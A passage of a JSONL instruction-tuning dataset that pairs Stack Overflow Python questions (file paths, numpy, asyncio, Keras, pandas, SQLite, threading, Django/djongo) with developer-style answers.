main()\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How do I generate txt files into separate directories with python?<p><strong>This is my code<\/strong><\/p>\n<pre class=\"lang-py prettyprint-override\"><code>import os\n\npwd = os.getcwd()\n\nplaylist_links = ['A', 'B', 'C', 'D', 'E', 'F',]\n\nfor link in playlist_links:\n    # Create the path\n    path = os.path.join(pwd, link)\n\n    # Create the directory\n    if not os.path.exists(path):\n        os.mkdir(path)\n\n    os.chdir(path)\n\n    with open(&quot;Z:\/www.rttv.com\/Change_Into_Dir_TEST\/single-video-v5-{}.txt&quot;.format(link), 'w', encoding=&quot;utf-8&quot;) as output_file:\n        output_file.write(link)\n\n    os.chdir(pwd)\n<\/code><\/pre>\n<p><strong>This is the output I get:<\/strong><\/p>\n<p><a href=\"https:\/\/i.stack.imgur.com\/3CMkv.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/3CMkv.png\" alt=\"enter image description here\" \/><\/a><\/p>\n<p>What I want is to have each txt file in its respected folder. For example:<\/p>\n<p><em>single-video-v5-A.txt should be in the A folder<\/em><\/p>\n<p><em>single-video-v5-B.txt should be in the B folder<\/em><\/p>\n<p><em>single-video-v5-C.txt should be in the C folder<\/em><\/p>\n<p>And so on and so forth...\nWhat exactly is wrong with my code?<\/p>\n<p>I would greatly appreciate any help. Thank you in advance!<\/p>","output_text":"<p>You should look toward this logic, changes are subtle but effect is crucial:<\/p>\n<pre><code>import os\npwd = os.getcwd()\nplaylist_links = ['A', 'B', 'C', 'D', 'E', 'F',]\n\nfor link in playlist_links:\n    path = os.path.join(pwd, link)\n    if not os.path.exists(path):\n        os.mkdir(path)\n    os.chdir(path)\n    \n    with open(f&quot;single-video-v5-{link}.txt&quot;, 'w', encoding=&quot;utf-8&quot;) as output_file:\n        output_file.write(link)\n    \n    os.chdir(pwd)\n<\/code><\/pre>\n<p>After the execution, checking the contents of the current working directory, then the contents of the A\/ directory:<\/p>\n<pre><code>$ ls\nA  B  C  D  E  F  p.py\n$ ls A\/\nsingle-video-v5-A.txt\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n how to multiply each row of a matrix with numpy<p>I am new on machine learning.Using python, numpy.\nI need to get a dot product on a matrix with size (3, 2) and each row of a matrix with size (100, 2), which is<\/p>\n<pre><code>a = [[1, 2], [3, 4], [5, 6]]\nb = [[5, 5], [6, 6], [7, 7], ...] # it has 100 row\n<\/code><\/pre>\n<p>and what i want is:<\/p>\n<pre><code>np.dot(a, b[0])\nnp.dot(a, b[1])\n<\/code><\/pre>\n<p>i currently have:<\/p>\n<pre><code>z = np.dot(a, b)\n<\/code><\/pre>\n<p>but the dimension doesn't match<\/p>\n<p>but i cannot use loop and the code need to be vectorized.<\/p>\n<p>can anyone give me some hints, thank you so much!!<\/p>","output_text":"<p>For a dot product to work, it requires the first dimension of <code>b<\/code> to match the second dimension of <code>a<\/code>. Thus you need to transpose <code>b<\/code>:<\/p>\n<pre><code>np.dot(a, b.T)\n<\/code><\/pre>\n<p>Output:<\/p>\n<pre><code>array([[15, 18, 21, 24],\n       [35, 42, 49, 56],\n       [55, 66, 77, 88]])\n<\/code><\/pre>\n<p>Or <code>a<\/code>, depending on the expected output:<\/p>\n<pre><code>&gt;&gt;&gt; np.dot(b, a.T)\narray([[15, 35, 55],\n       [18, 42, 66],\n       [21, 49, 77],\n       [24, 56, 88]])\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Create a lock\/unlock mechanism in async mode for Python<p>I have this new_lock function in JS, it's useful to avoid callback hell:<\/p>\n<pre class=\"lang-js prettyprint-override\"><code>function new_lock(){\n    var unlock,lock = new Promise((res,rej)=&gt;{ unlock=res; });\n    return [lock,unlock];\n}\n\nvar [lock,unlock] = new_lock();\ncall_some_func_with_callback(data,function(){\n    print(1);\n    print(2);\n    unlock();\n});\nawait lock;\n\nprint(3)\n<\/code><\/pre>\n<p>And this is my async Python main function to use 'await' keyword inside:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>import asyncio as aio\n\ndef new_lock():\n    ?How to put code here?\n    return lock,unlock\n\nasync main():\n    lock,unlock = new_lock()\n\n    def cb(ackdata):\n       print(1)\n       print(2)\n       unlock()\n\n    # Python web server emits to client side (browser)\n    socketio.emit(&quot;eventname&quot;,data,callback=cb)\n    await lock\n\n    print(3)\n\nif __name__==&quot;__main__&quot;:\n    loop = aio.get_event_loop()\n    t = loop.create_task(main())\n    loop.run_until_complete(t)\n<\/code><\/pre>\n<p>How to create the Python equivalent of the 'new_lock' function in JS? Or even that new_lock function necessary in Python?<\/p>","output_text":"<p>Why not just use <a href=\"https:\/\/python-socketio.readthedocs.io\/en\/latest\/api.html#asyncclient-class\" rel=\"nofollow noreferrer\">socket.io's <code>AsyncClient<\/code><\/a> or <a href=\"https:\/\/python-socketio.readthedocs.io\/en\/latest\/api.html#asyncserver-class\" rel=\"nofollow noreferrer\"><code>AsyncServer<\/code><\/a> class and just <a href=\"https:\/\/python-socketio.readthedocs.io\/en\/latest\/client.html#emitting-events\" rel=\"nofollow noreferrer\"><code>await sio.emit()<\/code><\/a>?<\/p>\n<p>Failing that, you're looking for <a href=\"https:\/\/docs.python.org\/3\/library\/asyncio-sync.html#asyncio.Event\" rel=\"nofollow noreferrer\">an <code>Event<\/code><\/a> async primitive:<\/p>\n<pre><code>import asyncio as aio\n\nasync main():\n    ev = aio.Event()\n\n    def cb(ackdata):\n       print(1)\n       print(2)\n       ev.set()\n\n    await socketio.emit(&quot;eventname&quot;,data,callback=cb)\n    await ev.wait()\n    print(3)\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Tensorflow: Logits and Label must be the same size<p>I am currently attempting a project in Google\/Udacity's Tensorflow Course using a dataset acquired as follows:<\/p>\n<pre><code>_URL = &quot;https:\/\/storage.googleapis.com\/download.tensorflow.org\/example_images\/flower_photos.tgz&quot;\n\nzip_file = tf.keras.utils.get_file(origin=_URL,\n                                   fname=&quot;flower_photos.tgz&quot;,\n                                   extract=True)\n\n<\/code><\/pre>\n<p>Unfortunately, I ran into the following error:<\/p>\n<pre><code>InvalidArgumentError:  logits and labels must have the same first dimension, got logits shape [100,5] and labels shape [500]\n     [[node sparse_categorical_crossentropy\/SparseSoftmaxCrossEntropyWithLogits\/SparseSoftmaxCrossEntropyWithLogits (defined at &lt;ipython-input-43-02964d57939c&gt;:8) ]] [Op:__inference_test_function_3591]\n<\/code><\/pre>\n<p>I looked at other posts, but it still seemed a bit tricky to figure out. My initial thought is that I might be using the incorrect loss function.<\/p>\n<p>Here is the code running into problems:<\/p>\n<pre><code>image_gen = ImageDataGenerator(rescale = 1.\/255, horizontal_flip=True, zoom_range=0.5, rotation_range=45, width_shift_range=0.15, height_shift_range=0.15)\n\ntrain_data_gen = image_gen.flow_from_directory(batch_size=BATCH_SIZE, directory = train_dir, shuffle=True, target_size=(IMG_SHAPE,IMG_SHAPE),class_mode='binary')\n\nimage_gen = ImageDataGenerator(rescale = 1.\/255)\n\nval_data_gen = image_gen.flow_from_directory(batch_size=BATCH_SIZE, directory = val_dir, shuffle=True, target_size=(IMG_SHAPE,IMG_SHAPE))\n\n\nmodel = tf.keras.models.Sequential([\n                                    tf.keras.layers.Conv2D(16, (3,3), activation='relu', input_shape=(150,150,3)),\n                                    tf.keras.layers.MaxPooling2D(2,2),\n                                    tf.keras.layers.Conv2D(32, (3,3), activation='relu'),\n                                    tf.keras.layers.MaxPooling2D(2,2),\n                                    tf.keras.layers.Conv2D(64, (3,3), activation='relu'),\n                                    tf.keras.layers.MaxPooling2D(2,2),\n                                    tf.keras.layers.Dropout(0.5),\n                                    tf.keras.layers.Flatten(),\n                                    tf.keras.layers.Dense(512, activation='relu'),\n                                    tf.keras.layers.Dense(5),\n                                    \n])\n\nmodel.compile(optimizer='adam',\n              loss=tf.keras.losses.SparseCategoricalCrossentropy(from_logits=True),\n              metrics=['accuracy'])\nmodel.summary()\n<\/code><\/pre>\n<p>The batch size is 100 and input dimension is 150,150\nThe summary is as follows:\nModel: &quot;sequential_4&quot;<\/p>\n<hr \/>\n<p>Layer (type)                 Output Shape              Param #<\/p>\n<p>conv2d_12 (Conv2D)           (None, 148, 148, 16)      448<\/p>\n<hr \/>\n<p>max_pooling2d_12 (MaxPooling (None, 74, 74, 16)        0<\/p>\n<hr \/>\n<p>conv2d_13 (Conv2D)           (None, 72, 72, 32)        4640<\/p>\n<hr \/>\n<p>max_pooling2d_13 (MaxPooling (None, 36, 36, 32)        0<\/p>\n<hr \/>\n<p>conv2d_14 (Conv2D)           (None, 34, 34, 64)        18496<\/p>\n<hr \/>\n<p>max_pooling2d_14 (MaxPooling (None, 17, 17, 64)        0<\/p>\n<hr \/>\n<p>dropout_4 (Dropout)          (None, 17, 17, 64)        0<\/p>\n<hr \/>\n<p>flatten_4 (Flatten)          (None, 18496)             0<\/p>\n<hr \/>\n<p>dense_8 (Dense)              (None, 512)               9470464<\/p>\n<hr \/>\n<p>dense_9 (Dense)              (None, 5)                 2565<\/p>\n<p>Total params: 9,496,613\nTrainable params: 9,496,613\nNon-trainable params: 0<\/p>\n<p>Any thoughts on what may be wrong?<\/p>","output_text":"<p>pay attention to class_mode in your generator<\/p>\n<p>'int': means that the labels are encoded as integers (e.g. for sparse_categorical_crossentropy loss). 'categorical' means that the labels are encoded as a categorical vector (e.g. for categorical_crossentropy loss). 'binary' means that the labels (there can be only 2) are encoded as float32 scalars with values 0 or 1 (e.g. for binary_crossentropy). None (no labels).<\/p>\n<p>it seems you need 'int' instead of 'binary' for both train and validation generator<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to filter for columns where the first row (not header) starts with string<p>I'm trying to filter a dataframe by the first row, but can't seem to figure out how to do it.<\/p>\n<p>Here's a sample version of the data I'm working with:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>In [11]: df = pd.DataFrame(\n    ...:     [['Open-Ended Response', 'Open-Ended Response', 'Response', 'Response'], [1, 2, 3, 4]],\n    ...:     columns=list('ABCD'),\n    ...: )\n\nIn [12]: df\nOut[12]:\n                     A                    B         C         D\n0  Open-Ended Response  Open-Ended Response  Response  Response\n1                    1                    2         3         4\n<\/code><\/pre>\n<p>What I want to do is filter for all columns that start with &quot;Response&quot; in the first non-header row. So in this case, just have the last two columns in there own dataframe.<\/p>\n<p>I can easily filter the header with something like this:<\/p>\n<pre><code>respo = [col for col in df if col.startswith('Response')]\n<\/code><\/pre>\n<p>But it doesn't seem to work if it's the 1t non-header row. Importantly, I need to keep the current header after I filter.<\/p>\n<p>Thank you.<\/p>","output_text":"<p>First step is to select the <em>values<\/em> of the first row:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>df.iloc[0]  # selects the values in the first row\n<\/code><\/pre>\n<p>Then, use python's <code>.str<\/code> StringAccessor methods for working with <em>data values<\/em> rather than column names:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>df.iloc[0].str.startswith('Response') # Test the result of the above line\n<\/code><\/pre>\n<p>This will give you a Series with True\/False values indexed by column name. Finally, use this to select the <em>columns<\/em> from your dataframe based on the matched labels:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>df.loc[:, df.iloc[0].str.startswith('Response')] # Select columns based on the test\n<\/code><\/pre>\n<p>This should do the trick!<\/p>\n<p>See pandas's docs on <a href=\"https:\/\/pandas.pydata.org\/pandas-docs\/stable\/user_guide\/indexing.html\" rel=\"nofollow noreferrer\">Indexing and Selecting Data<\/a> and the <a href=\"https:\/\/pandas.pydata.org\/pandas-docs\/stable\/user_guide\/text.html#testing-for-strings-that-match-or-contain-a-pattern\" rel=\"nofollow noreferrer\">StringAccessor methods<\/a> for more help.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to make a SQLite database file readable as a text file?<p>Im using SQLAlchemy database in python and the character in database is encoded and not understandable when I open with text file. Does anyone know do I make database file character readable? Any answer would be appriciated.<\/p>\n<p>Here is my database that is encoded<\/p>\n<pre><code>SQLite format 3@  %%.O}\n\\\\\u00c5!\u00c7%tablepostpostCREATE TABLE post (\n    id INTEGER NOT NULL, \n    title VARCHAR(30) NOT NULL, \n    detail VARCHAR(100), \n    due DATETIME NOT NULL, \n    PRIMARY KEY (id)\n)\n@\u0153\n\u0153\u00d5\u00f1\u0153\u00eeU\u00b0?++A\u201e\u00c5\u00c7\u201e\u00c5\u00d1\u201e\u00c5\u00dc\u201e\u00c5\u00e0\u201e\u00c5\u00e4\u201e\u00c5\u00e3\u201e\u00c5\u00e7\u201e\u00c5\u00e8\u201e\u00c5\u00eb\u201e\u00c5\u00ec2021-11-30 00:00:00.000000\u00b0;+#Atestings clasekasdsdasdasd2021-11-26 00:00:00.000000&lt;   -'ASADADASDAXDSACDAASDASDASDAXAE2021-11-19 00:00:00.0000001Atest45454two pills2021-11-05 00:00:00.000000VAMedicine44 meds2021-10-27 00:00:00.000000\u00eaAtesttestone pill2021-10-25 00:05%!AAndy's pillsfour pills2021-11-03 00:00:00.0000001\n<\/code><\/pre>\n<p>I want these text to be readable<\/p>\n<p>Here is my python code<\/p>\n<pre><code>from datetime import datetime, date\n\nfrom flask import Flask, render_template, request, redirect, url_for\nfrom flask_sqlalchemy import SQLAlchemy\n\napp = Flask(__name__)\napp.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:\/\/\/medicine-app.db'\n\ndb = SQLAlchemy(app)\n\n\nclass Post(db.Model):\n    id = db.Column(db.Integer, primary_key=True)\n    title = db.Column(db.String(30), nullable=False)\n    detail = db.Column(db.String(100))\n    due = db.Column(db.DateTime, nullable=False)\n\n@app.route('\/', methods=['GET', 'POST'])\ndef index():\n    if request.method == 'GET':\n        posts = Post.query.order_by(Post.due).all()\n        return render_template('index.html', posts=posts, today=date.today()) \n    else:\n        title = request.form.get('title')\n        detail = request.form.get('detail')\n        due = request.form.get('due')\n\n        due = datetime.strptime(due, '%Y-%m-%d')\n        new_post = Post(title=title, detail=detail, due=due) #making a new post from create\n\n        db.session.add(new_post)\n        db.session.commit()\n\n        return redirect('\/')\n\n\n@app.route('\/create')\ndef create():\n    return render_template('create.html')\n\n@app.route('\/detail\/&lt;int:id&gt;')\ndef read(id):\n    post = Post.query.get(id)\n    return render_template('detail.html', post=post)\n\n@app.route('\/update\/&lt;int:id&gt;', methods=['GET', 'POST'])\ndef update(id):\n    post = Post.query.get(id)\n    if request.method == 'GET':\n        return render_template('update.html', post=post)\n        #update paged\n    else:\n        post.title = request.form.get('title')\n        post.detail = request.form.get('detail')\n        request.form.get('due')\n        post.due = datetime.strftime, '%Y-%m-%d'\n\n        db.session.commit()\n        return redirect('\/')\n        #to database\n        #top page\n\n\n\n@app.route('\/delete\/&lt;int:id&gt;')\ndef delete(id):\n    post = Post.query.get(id)\n\n    db.session.delete(post)\n    db.session.commit()\n    return redirect('\/')\n\n\nif __name__ == '__main__':\n    app.run(debug=True)\n<\/code><\/pre>\n<p>I am also using HTML<\/p>","output_text":"<blockquote>\n<p>the character in database is encoded and not understandable when I open with text file. Does anyone know do I make database file character readable?<\/p>\n<\/blockquote>\n<p>You can't. SQLite database files are binary files, not text files. Opening them in a text editor will only produce semi-readable results because not all bytes (or sequences of bytes) represent valid characters regardless of the character encoding.<\/p>\n<p>On Linux, a hexdump (hd) of a SQLite file looks like this:<\/p>\n<pre class=\"lang-none prettyprint-override\"><code>$ hd gh_6927.sqlite \n00000000  53 51 4c 69 74 65 20 66  6f 72 6d 61 74 20 33 00  |SQLite format 3.|\n00000010  10 00 01 01 00 40 20 20  00 00 00 2e 00 00 00 04  |.....@  ........|\n00000020  00 00 00 04 00 00 00 02  00 00 00 1f 00 00 00 04  |................|\n00000030  00 00 00 00 00 00 00 00  00 00 00 01 00 00 00 00  |................|\n00000040  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n00000050  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 2e  |................|\n00000060  00 2e 3f d9 0d 00 00 00  01 0f 95 00 0f 95 0e 96  |..?.............|\n00000070  0e 96 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n00000080  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n*\n00000e90  00 00 00 00 00 00 00 00  01 6a 19 19 01 81 45 74  |.........j....Et|\n00000ea0  61 62 6c 65 74 61 62 6c  65 31 74 61 62 6c 65 31  |abletable1table1|\n00000eb0  03 43 52 45 41 54 45 20  54 41 42 4c 45 20 74 61  |.CREATE TABLE ta|\n00000ec0  62 6c 65 31 20 28 0a 09  69 64 20 49 4e 54 45 47  |ble1 (..id INTEG|\n00000ed0  45 52 20 4e 4f 54 20 4e  55 4c 4c 2c 20 0a 09 64  |ER NOT NULL, ..d|\n00000ee0  65 73 63 72 69 70 74 69  6f 6e 20 56 41 52 43 48  |escription VARCH|\n00000ef0  41 52 28 32 35 30 29 2c  20 0a 09 50 52 49 4d 41  |AR(250), ..PRIMA|\n00000f00  52 59 20 4b 45 59 20 28  69 64 29 0a 29 00 00 00  |RY KEY (id).)...|\n00000f10  f3 17 2b 2b 01 82 09 74  61 62 6c 65 61 6c 65 6d  |..++...tablealem|\n00000f20  62 69 63 5f 76 65 72 73  69 6f 6e 61 6c 65 6d 62  |bic_versionalemb|\n00000f30  69 63 5f 76 65 72 73 69  6f 6e 02 43 52 45 41 54  |ic_version.CREAT|\n00000f40  45 20 54 41 42 4c 45 20  61 6c 65 6d 62 69 63 5f  |E TABLE alembic_|\n00000f50  76 65 72 73 69 6f 6e 20  28 0a 09 76 65 72 73 69  |version (..versi|\n00000f60  6f 6e 5f 6e 75 6d 20 56  41 52 43 48 41 52 28 33  |on_num VARCHAR(3|\n00000f70  32 29 20 4e 4f 54 20 4e  55 4c 4c 2c 20 0a 09 43  |2) NOT NULL, ..C|\n00000f80  4f 4e 53 54 52 41 49 4e  54 20 61 6c 65 6d 62 69  |ONSTRAINT alembi|\n00000f90  63 5f 76 65 72 69 01 07  17 17 17 01 81 31 74 61  |c_veri.......1ta|\n00000fa0  62 6c 65 74 68 69 6e 67  74 68 69 6e 67 02 43 52  |blethingthing.CR|\n00000fb0  45 41 54 45 20 54 41 42  4c 45 20 74 68 69 6e 67  |EATE TABLE thing|\n00000fc0  20 28 0a 09 69 64 20 49  4e 54 45 47 45 52 20 4e  | (..id INTEGER N|\n00000fd0  4f 54 20 4e 55 4c 4c 2c  20 0a 09 74 78 74 20 56  |OT NULL, ..txt V|\n00000fe0  41 52 43 48 41 52 28 35  30 29 2c 20 0a 09 50 52  |ARCHAR(50), ..PR|\n00000ff0  49 4d 41 52 59 20 4b 45  59 20 28 69 64 29 0a 29  |IMARY KEY (id).)|\n00001000  0d 00 00 00 01 0f f3 00  0f f3 00 00 00 00 00 00  |................|\n00001010  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n*\n00001ff0  00 00 00 0b 01 03 00 1d  6e 65 77 20 74 65 78 74  |........new text|\n00002000  0d 00 00 00 00 10 00 00  00 00 00 00 00 00 00 00  |................|\n00002010  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n*\n00003000  00 00 00 00 00 00 00 01  00 00 00 03 00 00 00 02  |................|\n00003010  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n*\n00003ff0  0f 03 25 09 65 36 39 65  36 34 30 37 31 63 38 63  |..%.e69e64071c8c|\n00004000\n<\/code><\/pre>\n<p>If you want the <em>contents<\/em> of a particular table in that file to be in text-readable form you can export that table to a CSV file (or similar).<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Python multithreading program is giving unexpected output<p>I know that <strong>there is no guarantee regarding the order of execution for the threads.<\/strong> But my doubt is when I ran below code,<\/p>\n<pre><code>import threading\n\ndef doSomething():\n    print(&quot;Hello &quot;)\n\nd = threading.Thread(target=doSomething, args=())\nd.start()\nprint(&quot;done&quot;)\n<\/code><\/pre>\n<p>Output that is coming is either<\/p>\n<pre><code>Hello done\n<\/code><\/pre>\n<p>or this<\/p>\n<pre><code>Hello \ndone\n<\/code><\/pre>\n<p>May be if I try too much then it might give me below as well<\/p>\n<pre><code>done\nHello\n<\/code><\/pre>\n<p>But I am not convinced with the first output. Since order can be different but how come both outputs are available in the same line. Does that means that one thread is messing up with other threads working?<\/p>","output_text":"<p>This is a classic race condition. I can't personally reproduce it, and it would likely vary by interpreter implementation and the precise configuration applied to <code>stdout<\/code>. On Python interpreters without a GIL, there is basically no protection against races, and this behavior is expected to a certain extent. Python interpreters do tend to try to protect you from egregious data corruption due to threading, unlike C\/C++, but even if they ensure every byte written ends up actually printed, they usually wouldn't try to make explicit guarantees against interleaving; <code>Hdelolnoe<\/code> would be a possible (if fairly unlikely given likely implementations) output when you're making no effort whatsoever to synchronize access to <code>stdout<\/code>.<\/p>\n<p>On CPython, the GIL protects you more, and writing a single string to <code>stdout<\/code> is more likely to be atomic, but you're not writing a single string. Essentially, the implementation of <code>print<\/code> is to write objects one by one to the output file object as it goes, it doesn't batch up to a single string then call <code>write<\/code> just once. What this means is that:<\/p>\n<pre><code>print(&quot;Hello &quot;)  # Implicitly outputs default end argument of '\\n' after printing provided args\n<\/code><\/pre>\n<p>is roughly equivalent to:<\/p>\n<pre><code>sys.stdout.write(&quot;Hello &quot;)\nsys.stdout.write(&quot;\\n&quot;)\n<\/code><\/pre>\n<p>If the underlying stack of file objects that implements <code>sys.stdout<\/code> decides to engage in real I\/O in response to the first <code>write<\/code>, they'll release the GIL before performing the actual write, allowing the main thread to catch up and potentially grab the GIL before the worker thread is given a chance to write the newline. The main thread then outputs the <code>done<\/code> and then the newlines from each <code>print<\/code> come out in some unspecified (and irrelevant) order based on further potential races.<\/p>\n<p>Assuming you're on CPython, you could probably fix this by changing the code to this equivalent code using single <code>write<\/code> calls:<\/p>\n<pre><code>import threading\nimport sys\n\ndef doSomething():\n    sys.stdout.write(&quot;Hello \\n&quot;)\n\nd = threading.Thread(target=doSomething)  # If it takes no arguments, no need to pass args\nd.start()\nsys.stdout.write(&quot;done\\n&quot;)\n<\/code><\/pre>\n<p>and you'd be back to a race condition that only swaps the order, without interleaving (the language spec wouldn't guarantee a thing, but most reasonable implementations would be atomic for this case). If you want it to work with any guarantees without relying on the quirks of the implementation, you have to synchronize:<\/p>\n<pre><code>import threading\n\nlck = threading.Lock()\n\ndef doSomething():\n    with lck:\n        print(&quot;Hello &quot;)\n\nd = threading.Thread(target=doSomething)\nd.start()\nwith lck:\n    print(&quot;done&quot;)\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Export multiple dataframes to multiple workbooks<p>simple question:<\/p>\n\n<p>I want to export a list of dataframes in to multiple workbooks, one for each df using (df1,df2,df3) as a name but when I try to loop cant get it right, I'm quite new in python.<\/p>\n\n<p>That's my code<\/p>\n\n<pre><code>import pandas as pd\ndata_male = [['Alex',10],['Bob',12],['Clarke',13]]\n\ndata_female = [['Angelina',15],['Marta',14],['Anne',20]] \n\ndf1 = pd.DataFrame(data_male,columns=['Name','Age'])\n\ndf2 = pd.DataFrame(data_female,columns=['Name','Age'])\n\nexport = [df1,df2]\n\n\nfor i in export:\n    i.to_excel( i +'.xlsx')\n<\/code><\/pre>\n\n<p>Expected result: 2 independent excel workbooks, one called df1.xlsx with male data and another called df2.xlsx with female data<\/p>\n\n<p>thanks a lot.<\/p>","output_text":"<p>You should do <\/p>\n\n<pre><code>export = [df1,df2]\n\n\nfor id,i in enumerate(export):\n    i.to_excel( 'df'+str(id+1) +'.xlsx')\n<\/code><\/pre>\n\n<p>Update <\/p>\n\n<pre><code>d=dict(zip(['df1','df2'], export))\n\nfor id,i in d.items():\n    i.to_excel( id +'.xlsx')\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n local variable 'verify_payment' referenced before assignment<p>I'm having the local variable referenced before assignment error and I have tried a lot of ways that I can use to fix this. Any help would be greatly appreciated<\/p>\n<p>This is my <code>Views.py<\/code> (the error after the top of the second if statement)<\/p>\n<pre><code>def call_back_url(request):\n    reference = request.GET.get('reference')\n    # We need to fetch the reference from PAYMENT\n    check_pay = PayHistory.objects.filter(paystack_charge_id=reference).exists()\n    if check_pay == False:\n        # This means payment was not made error should be thrown here...\n        print(&quot;Error&quot;)\n    else:\n        payment = PayHistory.objects.get(paystack_charge_id=reference)\n        # We need to fetch this to verify if the payment was successful.\n        def verify_payment(request):\n            url = 'https:\/\/api.paystack.co\/transaction\/verify\/'+reference\n            headers = {\n                'Authorization': 'Bearer '+settings.PAYSTACK_SECRET_KEY,\n                'Content-Type' : 'application\/json',\n                'Accept': 'application\/json',\n                }\n            datum = {\n                &quot;reference&quot;: payment.paystack_charge_id\n                }\n            x = requests.get(url, data=json.dumps(datum), headers=headers)\n            if x.status_code != 200:\n                return str(x.status_code)\n            \n            results = x.json()\n            return results\n    initialized = verify_payment(request)\n    if initialized['data']['status'] == 'success':\n        PayHistory.objects.filter(paystack_charge_id=initialized['data']['reference']).update(paid=True)\n        new_payment = PayHistory.objects.get(paystack_charge_id=initialized['data']['reference'])\n        instance = Membership.objects.get(id=new_payment.payment_for.id)\n        sub = UserMembership.objects.filter(reference_code=initialized['data']['reference']).update(membership=instance)\n        user_membership = UserMembership.objects.get(reference_code=initialized['data']['reference'])\n        Subscription.objects.create(user_membership=user_membership, expires_in=dt.now().date() + timedelta(days=user_membership.membership.duration))\n        return redirect('subscribed')\n    return render(request, 'payment.html')\n\n\ndef subscribed(request):\n    return render(request, 'subscribed.html')\n<\/code><\/pre>","output_text":"<p>try:<\/p>\n<pre><code>def verify_payment(request):\n    url = 'https:\/\/api.paystack.co\/transaction\/verify\/'+reference\n    headers = {\n        'Authorization': 'Bearer '+settings.PAYSTACK_SECRET_KEY,\n        'Content-Type' : 'application\/json',\n        'Accept': 'application\/json',\n        }\n    datum = {\n        &quot;reference&quot;: payment.paystack_charge_id\n        }\n    x = requests.get(url, data=json.dumps(datum), headers=headers)\n    if x.status_code != 200:\n        return str(x.status_code)\n    \n    results = x.json()\n    return results\n\ndef call_back_url(request):\n    reference = request.GET.get('reference')\n    # We need to fetch the reference from PAYMENT\n    check_pay = PayHistory.objects.filter(paystack_charge_id=reference).exists()\n    if check_pay == False:\n        # This means payment was not made error should be thrown here...\n        print(&quot;Error&quot;)\n    else:\n        payment = PayHistory.objects.get(paystack_charge_id=reference)\n        # We need to fetch this to verify if the payment was successful.\n\n    initialized = verify_payment(request)\n    if initialized['data']['status'] == 'success':\n        PayHistory.objects.filter(paystack_charge_id=initialized['data']['reference']).update(paid=True)\n        new_payment = PayHistory.objects.get(paystack_charge_id=initialized['data']['reference'])\n        instance = Membership.objects.get(id=new_payment.payment_for.id)\n        sub = UserMembership.objects.filter(reference_code=initialized['data']['reference']).update(membership=instance)\n        user_membership = UserMembership.objects.get(reference_code=initialized['data']['reference'])\n        Subscription.objects.create(user_membership=user_membership, expires_in=dt.now().date() + timedelta(days=user_membership.membership.duration))\n        return redirect('subscribed')\n    return render(request, 'payment.html')\n\ndef subscribed(request):\n    return render(request, 'subscribed.html')\n\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n djongo Company with ID \u201cNone\u201d doesn\u2019t exist. Perhaps it was deleted?<p>I couldn't find a solution among similar questions.<\/p>\n<p><a href=\"https:\/\/i.stack.imgur.com\/JMSMT.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/JMSMT.png\" alt=\"enter image description here\" \/><\/a><\/p>\n<p>Using mongosh, the Company objects do exist, but in the admin, they show as object(None) and therefore cannot be edited due to error &quot;<strong>Company with ID \u201cNone\u201d doesn\u2019t exist. Perhaps it was deleted?<\/strong>&quot;. I guess it is about the &quot;id&quot; detection, but can not fix it myself. Question: how to fix the code to make the Company object to be shown correctly, not as None.<\/p>\n<pre><code>myproject&gt; db.companies_company.find()\n[\n  { _id: ObjectId(&quot;6145dd9a8bc9a685b2ae2375&quot;), name: 'company1' },\n  { _id: ObjectId(&quot;6145ddaa8bc9a685b2ae2377&quot;), name: 'company2' }\n]\n<\/code><\/pre>\n<p>models.py:<\/p>\n<pre><code>from django.db import models\n\n# Create your models here.\nclass Company(models.Model):\n    name = models.CharField(max_length=100, blank=False, null=False, unique=True)\n<\/code><\/pre>\n<p>admin.py:<\/p>\n<pre><code>from django.contrib import admin\n\n# Register your models here.\nfrom .models import Company\n\n@admin.register(Company)\nclass CompanyAdmin(admin.ModelAdmin):\n    pass\n<\/code><\/pre>","output_text":"<p>The manual setting of the _id field solved the issue.<\/p>\n<pre><code>from djongo import models\n\n# Create your models here.\nclass Company(models.Model):\n    _id = models.ObjectIdField()\n    name = models.CharField(max_length=100, blank=False, null=False, unique=True)\n<\/code><\/pre>"}
